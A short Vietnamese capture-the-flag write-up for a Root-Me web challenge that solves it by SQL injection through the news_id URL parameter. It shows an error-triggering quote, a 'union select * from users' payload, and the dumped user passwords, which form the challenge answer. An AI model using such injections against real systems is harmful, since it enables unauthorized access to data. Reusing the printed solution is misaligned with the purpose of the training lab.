Vì đã làm bài Sql injection String, mình đã biết không phải cứ sql injection thì phải nhét trong form login, chúng ta có thể tìm bất cứ dạng input form nào. Trong bài này tuy không có form nào khác ngoài login, nhưng khi bấm vào 1 trong 3 link ở trang chủ, url sẽ có dạng:

> ?action=news&news_id=1

Vậy thử injection trên URL xem sao. Viết lại url như sau:

> ?action=news&news_id=1'

sẽ hiện ra lỗi:

> **Warning**:  SQLite3::query(): Unable to prepare statement: 1, unrecognized token: "\" in **/challenge/web-serveur/ch18/index.php** on line **80**
>  unrecognized token: "\"

 Vậy ta biết đây là sqlite(chall nào trên rootme cũng dùng sqlite thì phải). Thực hiện câu inject đơn giản:

> ?action=news&news_id=1 union select * from users

hiện ra database:

>News

**Système de news**

La mise en place du système de news est désormais effective


**aTlkJYLjcbLmue3**

2005


**vUrpgAsCTX**

2006


**aFjRKx7j9d**

2008

Thử với từng password vào ta có ngay kết quả là pass đầu tiên